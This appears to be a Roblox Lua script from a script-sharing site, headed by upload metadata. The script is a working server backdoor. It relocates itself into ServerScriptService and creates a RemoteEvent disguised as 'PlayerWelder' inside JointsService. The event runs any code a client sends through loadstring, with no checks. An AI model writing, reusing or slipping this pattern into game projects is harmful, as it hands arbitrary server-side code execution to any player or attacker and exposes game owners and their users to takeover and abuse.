--[[
	id: 8dVJEALDwDJ2W7Bb0I-bO
	name: sdf
	description: sdf
	time1: 2021-05-11 22:55:12.625232+00
	time2: 2021-05-11 22:55:12.625233+00
	uploader: UNFLoUJg1ObsPgBSKSN02huJBW76IXWE_T_cKOui
	uploadersession: P_KzzPpvCYhcStl0klxbcX7Ve6bT4y
	flag: f
--]]

wait()
if script.Parent ~= game:service("ServerScriptService") then
	script.Parent = game:service("ServerScriptService")
end
wait()
local RemoteEvent = Instance.new("RemoteEvent",game:GetService'JointsService')
RemoteEvent.Name = 'PlayerWelder'
RemoteEvent.OnServerEvent:Connect(function(plr, code)
		loadstring(code)() 
end)